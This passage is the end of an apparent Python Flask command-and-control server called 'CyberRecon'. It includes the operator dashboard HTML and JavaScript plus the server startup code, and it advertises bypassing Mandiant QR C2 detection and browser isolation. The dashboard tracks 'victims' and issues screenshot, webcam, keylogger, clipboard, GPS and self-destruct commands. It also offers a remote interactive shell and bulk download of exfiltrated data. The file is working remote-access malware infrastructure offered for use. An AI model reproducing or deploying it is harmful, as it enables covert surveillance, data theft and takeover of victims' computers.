            padding: 14px; font-family: 'JetBrains Mono', monospace; font-size: 11px;
            color: var(--text-secondary); white-space: pre-wrap; word-break: break-all;
            max-height: 300px; overflow-y: auto; line-height: 1.6;
        }
        .empty-state {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            height: 220px; color: var(--text-muted); font-size: 12px; gap: 8px;
        }
        .empty-state-icon { font-size: 32px; opacity: 0.3; }
        .gps-info { padding: 14px; }
        .gps-coords { font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 700; color: var(--success); margin-bottom: 8px; }
        .gps-meta { color: var(--text-secondary); font-size: 12px; margin-bottom: 14px; }
        .log-panel { grid-column: 1 / -1; }
        .log-panel .panel-content { max-height: 200px; overflow-y: auto; }
        .log-entry {
            padding: 8px 14px; font-family: 'JetBrains Mono', monospace; font-size: 11px;
            border-bottom: 1px solid var(--border); display: flex; gap: 10px;
        }
        .log-entry .log-time { color: var(--text-muted); flex-shrink: 0; }
        .log-entry.info { color: var(--accent); }
        .log-entry.success { color: var(--success); }
        .log-entry.error { color: var(--danger); }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <div class="logo-icon">⚡</div>
            <div>
                <div class="logo-text">CyberRecon</div>
                <div class="logo-subtitle">MANDIANT QR C2 • BROWSER ISOLATION BYPASS</div>
            </div>
        </div>
        <div class="header-right">
            <div class="clock" id="clock">--:--:--</div>
            <div class="status-badge"><span class="status-dot"></span> LIVE</div>
            <a href="/logout" title="Sign out"
               style="padding:6px 14px;background:rgba(255,59,92,0.1);
                      border:1px solid rgba(255,59,92,0.3);border-radius:20px;
                      font-size:11px;font-weight:600;color:#ff3b5c;
                      text-decoration:none;cursor:pointer;">
                ⏻ LOGOUT
            </a>
        </div>
    </div>
    <div class="container">
        <div class="metrics">
            <div class="metric-card"><div class="metric-value" id="metric-victims">0</div><div class="metric-label">Active Victims</div></div>
            <div class="metric-card"><div class="metric-value" id="metric-exfil">0</div><div class="metric-label">Exfil Events</div></div>
            <div class="metric-card"><div class="metric-value" id="metric-screenshots">0</div><div class="metric-label">Screenshots</div></div>
            <div class="metric-card"><div class="metric-value" id="metric-webcam">0</div><div class="metric-label">Webcam Captures</div></div>
            <div class="metric-card"><div class="metric-value" id="metric-keystrokes">0</div><div class="metric-label">Keystroke Chunks</div></div>
        </div>
        <div class="grid">
            <div class="sidebar">
                <h3>🎯 TARGET VICTIMS</h3>
                <div class="command-bar">
                    <div class="dropdown" id="cmd-dropdown">
                        <button type="button" class="dropdown-toggle" id="cmd-toggle">
                            <span id="cmd-toggle-label">📸 Screenshot</span>
                            <span class="dropdown-arrow">▾</span>
                        </button>
                        <div class="dropdown-menu" id="cmd-menu">
                            <div class="dropdown-item" data-value="screenshot">📸 Screenshot</div>
                            <div class="dropdown-item" data-value="webcam_snap">📷 Webcam</div>
                            <div class="dropdown-item" data-value="keylog_start">⌨️ Keylog Start</div>
                            <div class="dropdown-item" data-value="keylog_stop">⌨️ Keylog Stop</div>
                            <div class="dropdown-item" data-value="clipboard_get">📋 Clipboard</div>
                            <div class="dropdown-item" data-value="gps_locate">📍 GPS Locate</div>
                            <div class="dropdown-item" data-value="process_list">⚙️ Process List</div>
                            <div class="dropdown-item" data-value="system_info">💻 System Info</div>
                            <div class="dropdown-item" data-value="whoami">👤 Whoami</div>
                            <div class="dropdown-item" data-value="self_destruct">💀 Self Destruct</div>
                        </div>
                    </div>
                    <button onclick="sendCommand()">SEND</button>
                </div>
                <button onclick="downloadAllData()" class="download-btn" id="download-btn" disabled>
                    ⬇ DOWNLOAD ALL DATA
                </button>
                <div class="victim-list" id="victim-list">
                    <div style="color:var(--text-muted);font-size:12px;padding:12px;text-align:center;">
                        <div style="font-size:24px;opacity:0.3;margin-bottom:8px;">🔍</div>
                        Waiting for victims...
                    </div>
                </div>
            </div>
            <div class="main-panel">
                <div class="panel">
                    <h3>📸 SCREENSHOTS</h3>
                    <div class="panel-content" id="screenshots-panel">
                        <div class="empty-state"><div class="empty-state-icon">📸</div>No screenshots yet</div>
                    </div>
                </div>
                <div class="panel">
                    <h3>📷 WEBCAM</h3>
                    <div class="panel-content" id="webcam-panel">
                        <div class="empty-state"><div class="empty-state-icon">📷</div>No webcam captures yet</div>
                    </div>
                </div>
                <div class="panel">
                    <h3>⌨️ KEYSTROKES</h3>
                    <div class="panel-content"><pre id="keystrokes-content">No keystrokes captured yet</pre></div>
                </div>
                <div class="panel">
                    <h3>📍 GPS LOCATION</h3>
                    <div class="panel-content" id="gps-panel">
                        <div class="empty-state"><div class="empty-state-icon">📍</div>No location data yet</div>
                    </div>
                </div>
                <div class="panel">
                    <h3>📋 COMMAND OUTPUT</h3>
                    <div class="panel-content"><pre id="output-content">whoami / system_info / process_list / clipboard results appear here</pre></div>
                </div>
                <div class="panel log-panel" style="grid-column: 1 / -1;">
                    <h3>🖥️ INTERACTIVE SHELL</h3>
                    <div class="shell-input-bar" style="display:flex;gap:8px;margin-bottom:12px;align-items:center;">
                        <span style="font-family:'JetBrains Mono',monospace;color:var(--success);font-size:14px;">$</span>
                        <input type="text" id="shell-input"
                               placeholder="Type a command (e.g. whoami, ipconfig, dir &quot;C:\\&quot;)"
                               autocomplete="off" spellcheck="false"
                               style="flex:1;padding:10px 12px;background:var(--bg-tertiary);
                                      border:1px solid var(--border);border-radius:8px;
                                      color:var(--text-primary);font-family:'JetBrains Mono',monospace;
                                      font-size:13px;outline:none;">
                        <button onclick="sendShellCommand()"
                                style="padding:10px 24px;background:var(--gradient-1);border:none;
                                       border-radius:8px;color:#06080f;font-family:inherit;
                                       font-weight:700;font-size:13px;cursor:pointer;">
                            EXECUTE
                        </button>
                    </div>
                    <div class="panel-content" style="max-height:260px;overflow-y:auto;">
                        <pre id="shell-output" style="font-family:'JetBrains Mono',monospace;font-size:12px;
                             color:var(--text-secondary);white-space:pre-wrap;padding:14px;
                             margin:0;">No commands run yet.</pre>
                    </div>
                </div>
                <div class="panel log-panel">
                    <h3>📜 EVENT LOG</h3>
                    <div class="panel-content" id="logs-panel">
                        <div class="log-entry info">
                            <span class="log-time">[--:--:--]</span><span>[SYSTEM] Command Center initialized</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        const OPERATOR_TOKEN = "__OPERATOR_TOKEN__";
        let selectedVictim = null;
        let victims = {};
        let lastVictimHash = '';
        let lastKnownCounts = { screenshots: 0, webcam: 0, keystrokes: 0, locations: 0, outputs: 0 };
        let lastTs = { screenshot: null, webcam: null, output: null, gps: null };
        const DOM = {
            clock: document.getElementById('clock'),
            victimList: document.getElementById('victim-list'),
            screenshotsPanel: document.getElementById('screenshots-panel'),
            webcamPanel: document.getElementById('webcam-panel'),
            keystrokesContent: document.getElementById('keystrokes-content'),
            gpsPanel: document.getElementById('gps-panel'),
            outputContent: document.getElementById('output-content'),
            logsPanel: document.getElementById('logs-panel'),
            downloadBtn: document.getElementById('download-btn'),
            metricVictims: document.getElementById('metric-victims'),
            metricExfil: document.getElementById('metric-exfil'),
            metricScreenshots: document.getElementById('metric-screenshots'),
            metricWebcam: document.getElementById('metric-webcam'),
            metricKeystrokes: document.getElementById('metric-keystrokes'),
        };
        function updateClock() {
            DOM.clock.textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
        }
        setInterval(updateClock, 1000); updateClock();
        function log(msg, type = 'info') {
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
            const t = document.createElement('span');
            t.className = 'log-time';
            t.textContent = `[${time}]`;
            const m = document.createElement('span');
            m.textContent = msg;
            entry.appendChild(t); entry.appendChild(m);
            DOM.logsPanel.insertBefore(entry, DOM.logsPanel.firstChild);
            while (DOM.logsPanel.children.length > 50) DOM.logsPanel.removeChild(DOM.logsPanel.lastChild);
        }
        function resetPanels() {
            lastTs = { screenshot: null, webcam: null, output: null, gps: null, shell: null };
            lastKnownCounts = { screenshots: 0, webcam: 0, keystrokes: 0, locations: 0, outputs: 0 };
            DOM.screenshotsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📸</div>No screenshots yet</div>';
            DOM.webcamPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📷</div>No webcam captures yet</div>';
            DOM.keystrokesContent.textContent = 'No keystrokes captured yet';
            DOM.gpsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📍</div>No location data yet</div>';
            DOM.outputContent.textContent = 'whoami / system_info / process_list / clipboard results appear here';
            const so = document.getElementById('shell-output');
            if (so) so.textContent = 'No commands run yet.';
            DOM.metricScreenshots.textContent = '0';
            DOM.metricWebcam.textContent = '0';
            DOM.metricKeystrokes.textContent = '0';
            DOM.metricExfil.textContent = '0';
        }
        function setPanelPending(panelId, label) {
            const el = document.getElementById(panelId);
            el.innerHTML = `<div class="empty-state">
                <div class="empty-state-icon" style="animation:spin 1s linear infinite;">⏳</div>
                ${label}
            </div>`;
        }
        function updateVictimList() {
            DOM.downloadBtn.disabled = !selectedVictim;
            DOM.victimList.innerHTML = '';
            const arr = Object.values(victims);
            if (arr.length === 0) {
                DOM.victimList.innerHTML = `<div style="color:var(--text-muted);font-size:12px;padding:12px;text-align:center;">
                    <div style="font-size:24px;opacity:0.3;margin-bottom:8px;">🔍</div>Waiting for victims...</div>`;
                return;
            }
            arr.forEach(v => {
                const card = document.createElement('div');
                card.className = `victim-card ${v.id === selectedVictim ? 'active' : ''}`;
                const statusClass = v.status === 'online' ? 'status-online' : 'status-offline';
                const statusIcon = v.status === 'online' ? '🟢' : '🔴';
                card.innerHTML = `
                    <h4>💻 ${v.hostname}</h4>
                    <p>🆔 ${v.id}</p>
                    <p>🖥️ ${v.os} | 👤 ${v.user}</p>
                    <p>🌐 ${v.ip}</p>
                    <p class="${statusClass}">${statusIcon} ${v.status}</p>`;
                card.onclick = () => {
                    selectedVictim = v.id;
                    resetPanels();
                    updateVictimList();
                    log(`Selected victim: ${v.hostname} (${v.id})`, 'info');
                    refreshExfilData();
                };
                DOM.victimList.appendChild(card);
            });
        }
        async function downloadAllData() {
            if (!selectedVictim) return;
            const btn = DOM.downloadBtn;
            const originalText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = 'PREPARING ZIP...';
            try {
                const resp = await fetch(`/download-all/${selectedVictim}?t=${Date.now()}`, {
                    headers: { 'X-Operator-Token': OPERATOR_TOKEN }
                });
                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
                const blob = await resp.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `CyberRecon_${selectedVictim}.zip`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
                log(`Downloaded all data for ${selectedVictim}`, 'success');
            } catch (e) {
                log(`Download failed: ${e.message}`, 'error');
            } finally {
                btn.disabled = false;
                btn.innerHTML = originalText;
            }
        }
        async function refreshVictims() {
            try {
                const resp = await fetch('/victims?t=' + Date.now());
                if (resp.status === 401) {
                    log('Session expired — redirecting to login', 'error');
                    setTimeout(() => window.location.href = '/login', 800);
                    return;
                }
                const data = await resp.json();
                const newHash = JSON.stringify(data.victims.map(v => v.id + v.status).sort());
                DOM.metricVictims.textContent = data.count;
                if (newHash !== lastVictimHash) {
                    lastVictimHash = newHash;
                    victims = {};
                    data.victims.forEach(v => { victims[v.id] = v; });
                    if (selectedVictim && !victims[selectedVictim]) {
                        log(`Victim ${selectedVictim} disappeared — deselecting`, 'error');
                        selectedVictim = null;
                        resetPanels();
                    }
                    updateVictimList();
                }
                if (!selectedVictim && data.count > 0) {
                    selectedVictim = data.victims[0].id;
                    resetPanels();
                    updateVictimList();
                    log(`Auto-selected victim: ${data.victims[0].hostname} (${selectedVictim})`, 'info');
                }
            } catch (e) { console.error(e); }
        }
        async function refreshExfilData() {
            if (!selectedVictim) return;
            try {
                const resp = await fetch(`/exfil-data/${selectedVictim}?t=` + Date.now());
                if (resp.status === 401) {
                    log('Session expired — redirecting to login', 'error');
                    setTimeout(() => window.location.href = '/login', 800);
                    return;
                }
                if (resp.status === 404) {
                    log(`Victim ${selectedVictim} no longer on server — deselecting`, 'error');
                    selectedVictim = null;
                    resetPanels();
                    updateVictimList();
                    return;
                }
                if (!resp.ok) return;
                const data = await resp.json();
                const ss = data.screenshots || [];
                if (ss.length) {
                    const last = ss[ss.length - 1];
                    if (last.ts !== lastTs.screenshot) {
                        lastTs.screenshot = last.ts;
                        const url = `/latest_screenshot/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
                        let img = DOM.screenshotsPanel.querySelector('img');
                        if (img) img.src = url;
                        else {
                            DOM.screenshotsPanel.innerHTML = '';
                            img = document.createElement('img');
                            img.src = url;
                            img.onerror = () => {
                                DOM.screenshotsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">⚠️</div>Screenshot not an image</div>';
                            };
                            DOM.screenshotsPanel.appendChild(img);
                        }
                        log(`Screenshot received`, 'success');
                    }
                }
                DOM.metricScreenshots.textContent = ss.length;
                const wc = data.webcam || [];
                if (wc.length) {
                    const last = wc[wc.length - 1];
                    if (last.ts !== lastTs.webcam) {
                        lastTs.webcam = last.ts;
                        const url = `/latest_webcam/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
                        let img = DOM.webcamPanel.querySelector('img');
                        if (img) img.src = url;
                        else {
                            DOM.webcamPanel.innerHTML = '';
                            img = document.createElement('img');
                            img.src = url;
                            img.onerror = () => {
                                DOM.webcamPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">⚠️</div>No camera available on victim</div>';
                            };
                            DOM.webcamPanel.appendChild(img);
                        }
                        log(`Webcam capture received`, 'success');
                    }
                }
                DOM.metricWebcam.textContent = wc.length;
                const kl = data.keystrokes || [];
                if (kl.length) {
                    if (kl.length !== lastKnownCounts.keystrokes) {
                        let text = '';
                        kl.forEach(k => { text += k.data; });
                        if (DOM.keystrokesContent.textContent !== text) {
                            DOM.keystrokesContent.textContent = text;
                        }
                        lastKnownCounts.keystrokes = kl.length;
                    }
                }
                DOM.metricKeystrokes.textContent = kl.length;
                const locs = data.locations || [];
                if (locs.length) {
                    const last = locs[locs.length - 1];
                    if (last.ts !== lastTs.gps) {
                        lastTs.gps = last.ts;
                        renderGPS(last.data);
                        log(`GPS location received`, 'success');
                    }
                }
                const outs = data.outputs || [];
                if (outs.length) {
                    const last = outs[outs.length - 1];
                    if (last.ts !== lastTs.output) {
                        lastTs.output = last.ts;
                        const body = typeof last.data === 'object'
                            ? JSON.stringify(last.data, null, 2)
                            : String(last.data);
                        if (last.type === 'shell') {
                            const so = document.getElementById('shell-output');
                            if (so) {
                                if (so.textContent === 'No commands run yet.') so.textContent = '';
                                so.textContent += body.endsWith('\n') ? body : body + '\n';
                                so.scrollTop = so.scrollHeight;
                            }
                        } else {
                            let text = `[${last.ts}] ${last.type.toUpperCase()}\n${'='.repeat(50)}\n${body}`;
                            DOM.outputContent.textContent = text;
                        }
                        log(`Output: ${last.type}`, 'success');
                    }
                }
                DOM.metricExfil.textContent = ss.length + wc.length + kl.length + locs.length + outs.length;
            } catch (e) { console.error(e); }
        }
        function renderGPS(loc) {
            if (typeof loc === 'string') { try { loc = JSON.parse(loc); } catch(e) { return; } }
            const lat = parseFloat(loc.latitude);
            const lon = parseFloat(loc.longitude);
            if (loc.error || isNaN(lat) || isNaN(lon) || (lat === 0 && lon === 0)) {
                DOM.gpsPanel.innerHTML = `<div class="empty-state"><div class="empty-state-icon">⚠️</div>${loc.error || 'Location unavailable'}</div>`;
                return;
            }
            const accuracy = loc.accuracy_m ? `±${Math.round(loc.accuracy_m)}m` : 'Unknown';
            const source = loc.source || 'Unknown';
            const d = 0.01;
            const bbox = `${(lon - d).toFixed(6)},${(lat - d).toFixed(6)},${(lon + d).toFixed(6)},${(lat + d).toFixed(6)}`;
            const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`;
            DOM.gpsPanel.innerHTML = `
                <div class="gps-info">
                    <div class="gps-coords">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
                    <div class="gps-meta">📍 ${source} • Accuracy: ${accuracy}</div>
                    <iframe src="${mapUrl}" style="width:100%;height:200px;border-radius:8px;border:1px solid var(--border);display:block;" loading="lazy"></iframe>
                </div>`;
        }
        async function sendCommand() {
            if (!selectedVictim) return;
            const cmd = selectedCmd;
            try {
                const resp = await fetch(`/command/${selectedVictim}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Operator-Token': OPERATOR_TOKEN
                    },
                    body: JSON.stringify({command: cmd})
                });
                if (resp.status === 401) {
                    log('Session expired — redirecting to login', 'error');
                    setTimeout(() => window.location.href = '/login', 800);
                    return;
                }
                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
                await resp.json();
                log(`Command queued: ${cmd}`, 'success');
                if (cmd === 'screenshot') setPanelPending('screenshots-panel', 'Capturing screen...');
                if (cmd === 'webcam_snap') setPanelPending('webcam-panel', 'Capturing webcam...');
                if (cmd === 'gps_locate')  setPanelPending('gps-panel', 'Locating...');
                if (cmd === 'clipboard_get') DOM.outputContent.textContent = 'Fetching clipboard...';
                enterFastPoll();
            } catch (e) {
                log(`Failed to send command: ${e.message}`, 'error');
            }
        }
        async function sendShellCommand() {
            if (!selectedVictim) {
                log('Select a victim first', 'error');
                return;
            }
            const input = document.getElementById('shell-input');
            const out = document.getElementById('shell-output');
            const raw = input.value.trim();
            if (!raw) return;
            if (out.textContent === 'No commands run yet.') out.textContent = '';
            out.textContent += `$ ${raw}\n`;
            out.scrollTop = out.scrollHeight;
            try {
                const resp = await fetch(`/shell/${selectedVictim}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Operator-Token': OPERATOR_TOKEN
                    },
                    body: JSON.stringify({ command: raw })
                });
                if (resp.status === 401) {
                    log('Session expired — redirecting to login', 'error');
                    setTimeout(() => window.location.href = '/login', 800);
                    return;
                }
                const data = await resp.json();
                if (!resp.ok) throw new Error(data.error || `HTTP ${resp.status}`);
                log(`Shell queued: ${raw}`, 'success');
                input.value = '';
                enterFastPoll();
            } catch (e) {
                out.textContent += `[ERROR] ${e.message}\n`;
                out.scrollTop = out.scrollHeight;
                log(`Shell failed: ${e.message}`, 'error');
            }
        }
        let victimsTimer = null;
        let exfilTimer = null;
        let fastPollUntil = 0;
        let exfilRunning = false;
        function currentExfilInterval() {
            return Date.now() < fastPollUntil ? 1000 : 3000;
        }
        function scheduleExfilPoll() {
            clearTimeout(exfilTimer);
            exfilTimer = setTimeout(async () => {
                if (selectedVictim && !exfilRunning) {
                    exfilRunning = true;
                    try { await refreshExfilData(); }
                    finally { exfilRunning = false; }
                }
                scheduleExfilPoll();
            }, currentExfilInterval());
        }
        function startPolling() {
            if (!victimsTimer) victimsTimer = setInterval(refreshVictims, 3000);
            if (!exfilTimer) scheduleExfilPoll();
        }
        function stopPolling() {
            if (victimsTimer) { clearInterval(victimsTimer); victimsTimer = null; }
            if (exfilTimer) { clearTimeout(exfilTimer); exfilTimer = null; }
        }
        function enterFastPoll() {
            fastPollUntil = Date.now() + 15000;
            scheduleExfilPoll();
        }
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                stopPolling();
            } else {
                refreshVictims();
                if (selectedVictim) refreshExfilData();
                startPolling();
            }
        });
        const dropdownEl = document.getElementById('cmd-dropdown');
        const dropdownToggle = document.getElementById('cmd-toggle');
        const dropdownMenu = document.getElementById('cmd-menu');
        const dropdownLabel = document.getElementById('cmd-toggle-label');
        let selectedCmd = 'screenshot';
        if (dropdownToggle) {
            dropdownToggle.addEventListener('click', (e) => {
                e.stopPropagation();
                dropdownMenu.classList.toggle('open');
            });
            document.querySelectorAll('#cmd-menu .dropdown-item').forEach(item => {
                item.addEventListener('click', () => {
                    selectedCmd = item.dataset.value;
                    dropdownLabel.textContent = item.textContent.trim();
                    document.querySelectorAll('#cmd-menu .dropdown-item').forEach(i => i.classList.remove('active'));
                    item.classList.add('active');
                    dropdownMenu.classList.remove('open');
                });
            });
            document.querySelector('#cmd-menu .dropdown-item[data-value="screenshot"]').classList.add('active');
            document.addEventListener('click', (e) => {
                if (!dropdownEl.contains(e.target)) dropdownMenu.classList.remove('open');
            });
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape') dropdownMenu.classList.remove('open');
            });
        }
        const shellHistory = [];
        let shellHistoryIdx = -1;
        const shellInputEl = document.getElementById('shell-input');
        if (shellInputEl) {
            shellInputEl.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    const val = shellInputEl.value.trim();
                    if (val && shellHistory[shellHistory.length - 1] !== val) {
                        shellHistory.push(val);
                    }
                    shellHistoryIdx = shellHistory.length;
                    sendShellCommand();
                } else if (e.key === 'ArrowUp') {
                    if (shellHistoryIdx > 0) {
                        shellHistoryIdx--;
                        shellInputEl.value = shellHistory[shellHistoryIdx];
                        setTimeout(() => shellInputEl.setSelectionRange(shellInputEl.value.length, shellInputEl.value.length), 0);
                    }
                    e.preventDefault();
                } else if (e.key === 'ArrowDown') {
                    if (shellHistoryIdx < shellHistory.length - 1) {
                        shellHistoryIdx++;
                        shellInputEl.value = shellHistory[shellHistoryIdx];
                    } else {
                        shellHistoryIdx = shellHistory.length;
                        shellInputEl.value = '';
                    }
                    e.preventDefault();
                }
            });
        }
        refreshVictims();
        startPolling();
        log('Command Center initialized • Polling active', 'info');
    </script>
</body>
</html>
"""


@app.route("/dashboard")
@require_dashboard_login
def dashboard():
    html = DASHBOARD_HTML.replace("__OPERATOR_TOKEN__", OPERATOR_TOKEN or "")
    return render_template_string(html)


if __name__ == "__main__":
    load_victims()
    print("=" * 60)
    print("  ⚡ CyberRecon Command Center v3.5 (HARDENED + AUTH + WIPE)")
    print("  Mandiant QR C2 Bypass • Browser Isolation Evasion")
    print("=" * 60)
    print(f"  Operator auth: {'ON' if REQUIRE_AUTH else 'OFF'}")
    print(f"  Victim auth:   {'ON' if REQUIRE_VICTIM_KEY else 'OFF'}")
    print(f"  QR encryption: {'AES-256-GCM' if _aesgcm else 'PLAINTEXT (set CYBERRECON_KEY in .env)'}")
    print(f"  Dashboard auth:{' ON (password required)' if DASHBOARD_PASSWORD else ' OFF (!! set CYBERRECON_DASHBOARD_PASSWORD !!)'}")
    print("=" * 60)

    if not C2_KEY:
        print("[!] WARNING: CYBERRECON_KEY missing — QR payloads are plaintext.")
    if _aesgcm is None and C2_KEY:
        print("[!] WARNING: CYBERRECON_KEY present but failed to load (must be 44 base64url chars).")
    if not DASHBOARD_PASSWORD:
        print("[!] WARNING: CYBERRECON_DASHBOARD_PASSWORD not set — dashboard login disabled!")

    ssl_ctx = None
    if os.path.exists("cert.pem") and os.path.exists("key.pem"):
        ssl_ctx = ("cert.pem", "key.pem")
        print("  TLS:           ENABLED (self-signed)")
    else:
        print("  TLS:           DISABLED (no cert.pem/key.pem)")
        print("[!] WARNING: client .env must use http:// if TLS is off.")

    print("=" * 60)
    scheme = "https" if ssl_ctx else "http"
    print(f"  REST API:    {scheme}://0.0.0.0:8443")
    print(f"  Dashboard:   {scheme}://0.0.0.0:8443/dashboard  (login required)")
    print("=" * 60)
    print("[i] Victim env: CYBERRECON_C2 / CYBERRECON_KEY / CYBERRECON_VICTIM_KEY must match.")
    print("[i] Self-destruct purges victim data from server memory + disk.")
    print("=" * 60)

    try:
        app.run(host="0.0.0.0", port=8443, debug=False,
                threaded=True, ssl_context=ssl_ctx)
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")
